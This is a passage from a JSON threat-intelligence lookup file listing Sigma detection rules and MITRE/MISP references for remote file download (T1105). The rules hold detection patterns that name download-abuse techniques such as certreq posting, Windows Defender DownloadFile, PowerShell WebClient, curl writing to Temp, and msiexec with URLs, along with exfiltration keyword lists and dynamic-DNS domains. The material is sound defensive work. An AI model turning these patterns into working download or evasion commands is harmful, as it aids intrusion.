                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/11/08\ndescription: Detects download of certain file types from hosts with dynamic DNS names\n  (selected list)\ndetection:\n  condition: selection\n  selection:\n    c-uri-extension:\n    - exe\n    - vbs\n    - bat\n    - rar\n    - ps1\n    - doc\n    - docm\n    - xls\n    - xlsm\n    - pptm\n    - rtf\n    - hta\n    - dll\n    - ws\n    - wsf\n    - sct\n    - zip\n    r-dns|endswith:\n    - .hopto.org\n    - .no-ip.org\n    - .no-ip.info\n    - .no-ip.biz\n    - .no-ip.com\n    - .noip.com\n    - .ddns.name\n    - .myftp.org\n    - .myftp.biz\n    - .serveblog.net\n    - .servebeer.com\n    - .servemp3.com\n    - .serveftp.com\n    - .servequake.com\n    - .servehalflife.com\n    - .servehttp.com\n    - .servegame.com\n    - .servepics.com\n    - .myvnc.com\n    - .ignorelist.com\n    - .jkub.com\n    - .dlinkddns.com\n    - .jumpingcrab.com\n    - .ddns.info\n    - .mooo.com\n    - .dns-dns.com\n    - .strangled.net\n    - .adultdns.net\n    - .craftx.biz\n    - .ddns01.com\n    - .dns53.biz\n    - .dnsapi.info\n    - .dnsd.info\n    - .dnsdynamic.com\n    - .dnsdynamic.net\n    - .dnsget.org\n    - .fe100.net\n    - .flashserv.net\n    - .ftp21.net\n    - .http01.com\n    - .http80.info\n    - .https443.com\n    - .imap01.com\n    - .kadm5.com\n    - .mysq1.net\n    - .ns360.info\n    - .ntdll.net\n    - .ole32.com\n    - .proxy8080.com\n    - .sql01.com\n    - .ssh01.com\n    - .ssh22.net\n    - .tempors.com\n    - .tftpd.net\n    - .ttl60.com\n    - .ttl60.org\n    - .user32.com\n    - .voip01.com\n    - .wow64.net\n    - .x64.me\n    - .xns01.com\n    - .dyndns.org\n    - .dyndns.info\n    - .dyndns.tv\n    - .dyndns-at-home.com\n    - .dnsomatic.com\n    - .zapto.org\n    - .webhop.net\n    - .25u.com\n    - .slyip.net\nfalsepositives:\n- Software downloads\nfields:\n- cs-ip\n- c-uri\nid: 195c1119-ef07-4909-bb12-e66f5e07bf3c\nlevel: medium\nlogsource:\n  category: proxy\nmodified: 2021/11/27\nreferences:\n- https://www.alienvault.com/blogs/security-essentials/dynamic-dns-security-and-potential-threats\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.command_and_control\n- attack.t1105\n- attack.t1568\ntitle: Download from Suspicious Dyndns Hosts\n",
                            "sigma:id": "195c1119-ef07-4909-bb12-e66f5e07bf3c",
                            "title": "Download from Suspicious Dyndns Hosts",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "eee00933-a761-4cd0-be70-c42fe91731e7",
                        "lookup_data": {
                            "description": "Detects when GfxDownloadWrapper.exe downloads file from non standard URL",
                            "raw": "author: Victor Sergeev, oscd.community\ndate: 2020/10/09\ndescription: Detects when GfxDownloadWrapper.exe downloads file from non standard\n  URL\ndetection:\n  condition: image_path and not filter\n  filter:\n    CommandLine|contains: gameplayapi.intel.com\n    ParentImage|endswith:\n    - \\GfxDownloadWrapper.exe\n    - \\igfxEM.exe\n  image_path:\n    Image|endswith: \\GfxDownloadWrapper.exe\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: eee00933-a761-4cd0-be70-c42fe91731e7\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/01/06\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/GfxDownloadWrapper/\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: GfxDownloadWrapper.exe Downloads File from Suspicious URL\n",
                            "sigma:id": "eee00933-a761-4cd0-be70-c42fe91731e7",
                            "title": "GfxDownloadWrapper.exe Downloads File from Suspicious URL",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aac2fd97-bcba-491b-ad66-a6edf89c71bf",
                        "lookup_data": {
                            "description": "Detects executable access via webdav6. Can be seen in APT 29 such as from the emulated APT 29 hackathon https://github.com/OTRF/detection-hackathon-apt29/",
                            "raw": "author: SOC Prime, Adam Swan\ndate: 2020/05/01\ndescription: Detects executable access via webdav6. Can be seen in APT 29 such as\n  from the emulated APT 29 hackathon https://github.com/OTRF/detection-hackathon-apt29/\ndetection:\n  condition: selection_webdav and selection_executable\n  selection_executable:\n  - resp_mime_types|contains: dosexec\n  - c-uri|endswith: .exe\n  selection_webdav:\n  - c-useragent|contains: WebDAV\n  - c-uri|contains: webdav\nfalsepositives:\n- Unknown\nid: aac2fd97-bcba-491b-ad66-a6edf89c71bf\nlevel: medium\nlogsource:\n  product: zeek\n  service: http\nmodified: 2021/11/27\nreferences:\n- http://carnal0wnage.attackresearch.com/2012/06/webdav-server-to-download-custom.html\n- https://github.com/OTRF/detection-hackathon-apt29\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Executable from Webdav\n",
                            "sigma:id": "aac2fd97-bcba-491b-ad66-a6edf89c71bf",
                            "title": "Executable from Webdav",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fc4f4817-0c53-4683-a4ee-b17a64bc1039",
                        "lookup_data": {
                            "description": "Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/07/03\ndescription: Detects a suspicious Microsoft desktopimgdownldr file creation that stores\n  a file to a suspicious location or contains a file with a suspicious extension\ndetection:\n  condition: selection and not filter1 and not filter2\n  filter1:\n    TargetFilename|contains: C:\\Windows\\\n  filter2:\n    TargetFilename|contains:\n    - .jpg\n    - .jpeg\n    - .png\n  selection:\n    Image|endswith: \\svchost.exe\n    TargetFilename|contains: \\Personalization\\LockScreenImage\\\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nfields:\n- CommandLine\n- ParentCommandLine\nid: fc4f4817-0c53-4683-a4ee-b17a64bc1039\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/06/02\nreferences:\n- https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n- https://twitter.com/SBousseaden/status/1278977301745741825\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1105\ntitle: Suspicious Desktopimgdownldr Target File\n",
                            "sigma:id": "fc4f4817-0c53-4683-a4ee-b17a64bc1039",
                            "title": "Suspicious Desktopimgdownldr Target File",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "46123129-1024-423e-9fae-43af4a0fa9a5",
                        "lookup_data": {
                            "description": "Detect the use of Windows Defender to download payloads",
                            "raw": "author: Matthew Matchen\ndate: 2020/09/04\ndescription: Detect the use of Windows Defender to download payloads\ndetection:\n  condition: all of selection*\n  selection1:\n  - CommandLine|contains: MpCmdRun.exe\n  - Description: Microsoft Malware Protection Command Line Utility\n  selection2:\n    CommandLine|contains|all:\n    - DownloadFile\n    - url\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: 46123129-1024-423e-9fae-43af4a0fa9a5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866\n- https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218\n- attack.command_and_control\n- attack.t1105\ntitle: Windows Defender Download Activity\n",
                            "sigma:id": "46123129-1024-423e-9fae-43af4a0fa9a5",
                            "title": "Windows Defender Download Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
                        "lookup_data": {
                            "description": "Operation â€˜Harvestâ€™: A Deep Dive into a Long-term Campaign",
                            "link": "http://www.botvrij.eu/data/feed-osint/c1bd5026-520b-45bd-9a79-82d38cf96c7b.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1633469315",
                            "uuid": "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5d498330-f574-4889-bcc9-c53c950d210f",
                        "lookup_data": {
                            "description": "OSINT - Sharpening the Machete",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5d498330-f574-4889-bcc9-c53c950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1566552908",
                            "uuid": "5d498330-f574-4889-bcc9-c53c950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4480827a-9799-4232-b2c4-ccc6c4e9e12b",
                        "lookup_data": {
                            "description": "Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files",
                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/11/24\ndescription: Detects a suspicious certreq execution taken from the LOLBAS examples,\n  which can be abused to download (small) files\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains|all:\n    - ' -Post '\n    - ' -config '\n    - ' http'\n    - ' C:\\windows\\win.ini '\n  selection_img:\n  - Image|endswith: \\certreq.exe\n  - OriginalFileName: CertReq.exe\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\n- ParentCommandLine\nid: 4480827a-9799-4232-b2c4-ccc6c4e9e12b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/13\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Certreq/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Certreq Command to Download\n",
                            "sigma:id": "4480827a-9799-4232-b2c4-ccc6c4e9e12b",
                            "title": "Suspicious Certreq Command to Download",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc",
                        "lookup_data": {
                            "description": "Detects a suspicious call to Invoke-WebRequest cmdlet where the and output is located in a suspicious location",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/02\ndescription: Detects a suspicious call to Invoke-WebRequest cmdlet where the and output\n  is located in a suspicious location\ndetection:\n  condition: all of selection_*\n  selection_flags:\n    CommandLine|contains:\n    - ' -ur'\n    - ' -o'\n  selection_iwr:\n    CommandLine|contains:\n    - Invoke-WebRequest\n    - 'iwr '\n    - 'wget '\n    - 'curl '\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\cmd.exe\n  selection_susp_locations:\n    CommandLine|contains:\n    - \\AppData\\\n    - \\Users\\Public\\\n    - \\Temp\\\n    - '%AppData%'\n    - '%Temp%'\n    - '%tmp%'\n    - '%Public%'\n    - \\Desktop\\\n    - C:\\Windows\\\nfalsepositives:\n- Unknown\nid: 5e3cc4d8-3e68-43db-8656-eaaeefdec9cc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/13\nreferences:\n- https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nrelated:\n- id: e218595b-bbe7-4ee5-8a96-f32a24ad3468\n  type: derived\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Invoke-WebRequest Usage\n",
                            "sigma:id": "5e3cc4d8-3e68-43db-8656-eaaeefdec9cc",
                            "title": "Suspicious Invoke-WebRequest Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cdecc44a-1dbf-4c1f-881c-f21e3f47272a",
                        "lookup_data": {
                            "mitre-attack-id": "T1105",
                            "mitre-cti:description": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",
                            "mitre-cti:name": "Remote File Copy Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--cdecc44a-1dbf-4c1f-881c-f21e3f47272a', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/mitigations/T1105', 'external_id': 'T1105'}, {'source_name': 'University of Birmingham C2', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf'}], 'modified': '2019-07-25T11:33:35.477Z', 'name': 'Remote File Copy Mitigation', 'description': 'Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d7825193-b70a-48a4-b992-8b5b3015cc11",
                        "lookup_data": {
                            "description": "Detects code execution via the Windows Update client (wuauclt)",
                            "raw": "author: FPT.EagleEye Team\ndate: 2020/10/17\ndescription: Detects code execution via the Windows Update client (wuauclt)\ndetection:\n  condition: all of selection* and not filter\n  filter:\n    CommandLine|contains:\n    - ' /ClassId '\n    - ' wuaueng.dll '\n  selection_cli:\n    CommandLine|contains|all:\n    - /UpdateDeploymentProvider\n    - /RunHandlerComServer\n    - .dll\n  selection_img:\n  - Image|endswith: \\wuauclt.exe\n  - OriginalFileName: wuauclt.exe\nfalsepositives:\n- Unknown\nid: d7825193-b70a-48a4-b992-8b5b3015cc11\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://dtm.uk/wuauclt/\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.execution\n- attack.t1105\n- attack.t1218\ntitle: Windows Update Client LOLBIN\n",
                            "sigma:id": "d7825193-b70a-48a4-b992-8b5b3015cc11",
                            "title": "Windows Update Client LOLBIN",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e51acb2-bcbe-435b-99c6-0e3cd5e2aa59",
                        "lookup_data": {
                            "description": "Various protocols maybe used to put data on the device for exfil or infil",
                            "raw": "author: Austin Clark\ndate: 2019/08/12\ndescription: Various protocols maybe used to put data on the device for exfil or infil\ndetection:\n  condition: keywords\n  keywords:\n  - tftp\n  - rcp\n  - puts\n  - copy\n  - configure replace\n  - archive tar\nfalsepositives:\n- Generally used to copy configs or IOS images\nfields:\n- CmdSet\nid: 5e51acb2-bcbe-435b-99c6-0e3cd5e2aa59\nlevel: low\nlogsource:\n  product: cisco\n  service: aaa\nmodified: 2023/01/04\nstatus: test\ntags:\n- attack.collection\n- attack.lateral_movement\n- attack.command_and_control\n- attack.exfiltration\n- attack.t1074\n- attack.t1105\n- attack.t1560.001\ntitle: Cisco Stage Data\n",
                            "sigma:id": "5e51acb2-bcbe-435b-99c6-0e3cd5e2aa59",
                            "title": "Cisco Stage Data",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e218595b-bbe7-4ee5-8a96-f32a24ad3468",
                        "lookup_data": {
                            "description": "Detects a suspicious curl process start on Windows and outputs the requested document to a local file",
                            "raw": "author: Florian Roth (Nextron Systems), Nasreddine Bencherchali\ndate: 2020/07/03\ndescription: Detects a suspicious curl process start on Windows and outputs the requested\n  document to a local file\ndetection:\n  condition: selection_curl and 1 of selection_susp* and not 1 of filter_*\n  filter_git_windows:\n    CommandLine|contains|all:\n    - '--silent --show-error --output '\n    - gfw-httpget-\n    Image: C:\\Program Files\\Git\\mingw64\\bin\\curl.exe\n    ParentImage: C:\\Program Files\\Git\\usr\\bin\\sh.exe\n  selection_curl:\n  - Image|endswith: \\curl.exe\n  - Product: The curl executable\n  selection_susp_extensions:\n    CommandLine|endswith:\n    - .jpg\n    - .jpeg\n    - .png\n    - .gif\n    - .tmp\n    - .temp\n    - .txt\n  selection_susp_locations:\n    CommandLine|contains:\n    - \\AppData\\\n    - \\Users\\Public\\\n    - \\Temp\\\n    - '%AppData%'\n    - '%Temp%'\n    - '%tmp%'\n    - '%Public%'\n    - \\Desktop\\\n    - C:\\PerfLogs\\\n  selection_susp_remote_name_or_output:\n    CommandLine|contains:\n    - ' -O'\n    - --remote-name\n    - --output\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: e218595b-bbe7-4ee5-8a96-f32a24ad3468\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/11\nreferences:\n- https://twitter.com/max_mal_/status/1542461200797163522\n- https://web.archive.org/web/20200128160046/https://twitter.com/reegun21/status/1222093798009790464\n- https://github.com/pr0xylife/Qakbot/blob/4f0795d79dabee5bc9dd69f17a626b48852e7869/Qakbot_AA_23.06.2022.txt\n- https://www.volexity.com/blog/2022/07/28/sharptongue-deploys-clever-mail-stealing-browser-extension-sharpext/\nrelated:\n- id: bbeaed61-1990-4773-bf57-b81dbad7db2d\n  type: derived\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Suspicious Curl Usage on Windows\n",
                            "sigma:id": "e218595b-bbe7-4ee5-8a96-f32a24ad3468",
                            "title": "Suspicious Curl Usage on Windows",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ea34fb97-e2c4-4afb-810f-785e4459b194",
                        "lookup_data": {
                            "description": "Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/15\ndescription: Detects a curl process start on linux, which indicates a file download\n  from a remote location or a simple web request to a remote server\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: /curl\nfalsepositives:\n- Scripts created by developers and admins\n- Administrative activity\nid: ea34fb97-e2c4-4afb-810f-785e4459b194\nlevel: low\nlogsource:\n  category: process_creation\n  product: linux\nreferences:\n- https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Curl Usage on Linux\n",
                            "sigma:id": "ea34fb97-e2c4-4afb-810f-785e4459b194",
                            "title": "Curl Usage on Linux",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1ac8666b-046f-4201-8aba-1951aaec03a3",
                        "lookup_data": {
                            "description": "Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)",
                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019/01/16\ndescription: Detects a suspicious command line execution that includes an URL and\n  AppData string in the command line parameters as used by several droppers (js/vbs\n  > powershell)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - http\n    - ://\n    - '%AppData%'\n    Image|endswith: \\cmd.exe\nfalsepositives:\n- High\nfields:\n- CommandLine\n- ParentCommandLine\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n- https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.003\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1105\ntitle: Command Line Execution with Suspicious URL and AppData Strings\n",
                            "sigma:id": "1ac8666b-046f-4201-8aba-1951aaec03a3",
                            "title": "Command Line Execution with Suspicious URL and AppData Strings",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "635dbb88-67b3-4b41-9ea5-a3af2dd88153",
                        "lookup_data": {
                            "description": "Detects an executable in the Windows folder accessing github.com",
                            "raw": "author: Michael Haag (idea), Florian Roth (Nextron Systems)\ndate: 2017/08/24\ndescription: Detects an executable in the Windows folder accessing github.com\ndetection:\n  condition: selection\n  selection:\n    DestinationHostname|endswith:\n    - .github.com\n    - .githubusercontent.com\n    Image|startswith: C:\\Windows\\\n    Initiated: 'true'\nfalsepositives:\n- Unknown\n- '@subTee in your network'\nid: 635dbb88-67b3-4b41-9ea5-a3af2dd88153\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/M_haggis/status/900741347035889665\n- https://twitter.com/M_haggis/status/1032799638213066752\n- https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/exfil/Invoke-ExfilDataToGitHub.ps1\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1105\n- attack.exfiltration\n- attack.t1567.001\ntitle: Microsoft Binary Github Communication\n",
                            "sigma:id": "635dbb88-67b3-4b41-9ea5-a3af2dd88153",
                            "title": "Microsoft Binary Github Communication",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "08249dc0-a28d-4555-8ba5-9255a198e08c",
                        "lookup_data": {
                            "description": "Detects a script interpreter wscript/cscript opening a network connection. Adversaries may use script to download malicious payloads.",
                            "raw": "author: frack113\ndate: 2022/08/28\ndescription: Detects a script interpreter wscript/cscript opening a network connection.\n  Adversaries may use script to download malicious payloads.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\n    Initiated: 'true'\nfalsepositives:\n- Legitimate scripts\nid: 08249dc0-a28d-4555-8ba5-9255a198e08c\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/28d190330fe44de6ff4767fc400cc10fa7cd6540/atomics/T1105/T1105.md\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Script Initiated Connection\n",
                            "sigma:id": "08249dc0-a28d-4555-8ba5-9255a198e08c",
                            "title": "Script Initiated Connection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9292293b-8496-4715-9db6-37028dcda4b3",
                        "lookup_data": {
                            "description": "Detects the use of Replace.exe which can be used to replace file with another file",
                            "raw": "author: frack113\ndate: 2022/03/06\ndescription: Detects the use of Replace.exe which can be used to replace file with\n  another file\ndetection:\n  argument:\n    CommandLine|contains:\n    - /a\n    - -a\n  condition: selection and argument\n  selection:\n    Image|endswith: \\replace.exe\nfalsepositives:\n- Unknown\nid: 9292293b-8496-4715-9db6-37028dcda4b3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/06/22\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Replace/\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/replace\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Replace.exe Usage\n",
                            "sigma:id": "9292293b-8496-4715-9db6-37028dcda4b3",
                            "title": "Replace.exe Usage",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "992a6cae-db6a-43c8-9cec-76d7195c96fc",
                        "lookup_data": {
                            "description": "Detects a script interpreter wscript/cscript opening a network connection to a non-local network. Adversaries may use script to download malicious payloads.",
                            "raw": "author: frack113, Florian Roth\ndate: 2022/08/28\ndescription: Detects a script interpreter wscript/cscript opening a network connection\n  to a non-local network. Adversaries may use script to download malicious payloads.\ndetection:\n  condition: selection and not 1 of filter*\n  filter_ipv6:\n    DestinationIp|startswith:\n    - ::1\n    - 0:0:0:0:0:0:0:1\n    - 'fe80:'\n    - fc\n    - fd\n  filter_lan:\n    DestinationIp|startswith:\n    - '127.'\n    - '10.'\n    - '172.'\n    - '192.'\n    - 169.254.\n    - '20.'\n  selection:\n    Image|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\n    Initiated: 'true'\nfalsepositives:\n- Legitimate scripts\nid: 992a6cae-db6a-43c8-9cec-76d7195c96fc\nlevel: high\nlogsource:\n  category: network_connection\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/28d190330fe44de6ff4767fc400cc10fa7cd6540/atomics/T1105/T1105.md\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Script Initiated Connection to Non-Local Network\n",
                            "sigma:id": "992a6cae-db6a-43c8-9cec-76d7195c96fc",
                            "title": "Script Initiated Connection to Non-Local Network",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
                        "lookup_data": {
                            "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/08/28\ndescription: Detects the execution of powershell, a WebClient object creation and\n  the invocation of DownloadFile in a single command line\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - powershell\n    - .DownloadFile\n    - System.Net.WebClient\nfalsepositives:\n- Unknown\nid: 8f70ac5f-1f6f-4f8e-b454-db19561216c5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1104\n- attack.t1105\ntitle: PowerShell DownloadFile\n",
                            "sigma:id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
                            "title": "PowerShell DownloadFile",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f",
                        "lookup_data": {
                            "description": "Detects usage of the \"type\" command to download/upload data from WebDAV server",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/14\ndescription: Detects usage of the \"type\" command to download/upload data from WebDAV\n  server\ndetection:\n  condition: 1 of selection_*\n  selection_download:\n    CommandLine|contains|all:\n    - type \\\\\\\\\n    - ' > '\n  selection_upload:\n    CommandLine|contains|all:\n    - 'type '\n    - ' > \\\\\\\\'\nfalsepositives:\n- Unknown\nid: aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://mr0range.com/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Potential Download/Upload Activity Using Type Command\n",
                            "sigma:id": "aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f",
                            "title": "Potential Download/Upload Activity Using Type Command",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "44143844-0631-49ab-97a0-96387d6b2d7c",
                        "lookup_data": {
                            "description": "Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/06/10\ndescription: Detects execution of the Notepad++ updater (gup) from a process other\n  than Notepad++ to download files.\ndetection:\n  condition: all of selection* and not filter\n  filter:\n    ParentImage|endswith: \\notepad++.exe\n  selection_cli:\n    CommandLine|contains|all:\n    - ' -unzipTo '\n    - http\n  selection_img:\n  - Image|endswith: \\GUP.exe\n  - OriginalFileName: gup.exe\nfalsepositives:\n- Other parent processes other than notepad++ using GUP that are not currently identified\nid: 44143844-0631-49ab-97a0-96387d6b2d7c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://twitter.com/nas_bench/status/1535322182863179776\nstatus: experimental\ntags:\n- attack.command_and_control\n- attack.t1105\ntitle: Download Files Using Notepad++ GUP Utility\n",
                            "sigma:id": "44143844-0631-49ab-97a0-96387d6b2d7c",
                            "title": "Download Files Using Notepad++ GUP Utility",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
                        "lookup_data": {
                            "description": "Detects suspicious msiexec process starts with web addresses as parameter",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/02/09\ndescription: Detects suspicious msiexec process starts with web addresses as parameter\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' msiexec'\n    - ://\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nid: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/01/07\nreferences:\n- https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\nrelated:\n- id: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\n  type: similar\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.007\n- attack.command_and_control\n- attack.t1105\ntitle: MsiExec Web Install\n",
                            "sigma:id": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
                            "title": "MsiExec Web Install",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "00bca14a-df4e-4649-9054-3f2aa676bc04",
                        "lookup_data": {
                            "description": "Detects a suspicious curl process start the adds a file to a web request",
